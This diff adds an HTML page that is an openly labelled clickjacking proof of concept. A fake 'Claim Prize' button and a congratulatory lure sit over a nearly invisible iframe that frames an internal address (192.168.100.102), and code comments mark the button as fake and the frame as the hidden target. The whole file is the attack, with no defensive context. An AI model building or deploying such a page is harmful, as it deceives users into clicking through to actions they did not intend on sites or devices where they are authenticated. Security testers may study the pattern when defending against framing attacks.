@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>🎁 Win a Free Prize!</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      background: #f7f7f7;
+      text-align: center;
+    }
+
+    .overlay-text {
+      position: relative;
+      z-index: 3;
+      margin-top: 50px;
+    }
+
+    .prize-button {
+      position: absolute;
+      top: 300px;
+      left: 450px;
+      width: 150px;
+      height: 50px;
+      background-color: gold;
+      color: black;
+      font-size: 18px;
+      font-weight: bold;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      z-index: 3;
+    }
+
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 1000px;
+      height: 800px;
+      opacity: 0.05; /* transparent iframe */
+      z-index: 2;
+      pointer-events: auto;
+    }
+
+  </style>
+</head>
+<body>
+  <div class="overlay-text">
+    <h1>🎉 Congratulations!</h1>
+    <p>You’ve been selected to win a free gift. Click the button below to claim your prize!</p>
+  </div>
+
+  <!-- Fake prize button (user thinks they're clicking this) -->
+  <button class="prize-button">Claim Prize 🎁</button>
+
+  <!-- Hidden target page -->
+  <iframe src="http://192.168.100.102"></iframe>
+</body>
+</html>
